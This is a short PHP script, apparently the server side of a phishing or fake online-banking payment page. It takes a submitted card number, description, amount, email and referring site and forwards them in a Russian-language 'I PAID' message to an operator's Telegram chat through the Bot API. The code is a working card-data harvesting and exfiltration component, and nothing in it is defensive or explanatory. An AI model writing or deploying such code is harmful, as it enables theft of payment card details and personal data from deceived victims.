<?php
include_once 'config.php';
$card = $_POST['card'];
$desc = $_POST['desc'];
$amount = $_POST['amount'];
$email = $_POST['email'];
$referrer = $_POST['ref'];

  $tg = file_get_contents("https://api.telegram.org/bot$tg_token/sendMessage?chat_id=$tg_id&text=✅ Я ОПЛАТИЛ (OnlineBanking)%0AКарта: $card%0AОписание:%20️$desc%0AСумма:%20$amount%0AПочта:%20$email%0AСайт:%20$referrer%0A");
 // $tgakk = file_get_contents( "https://api.telegram.org/bot$tg_token/sendMessage?chat_id=$tg_id&text=$desc" );

echo 'success';


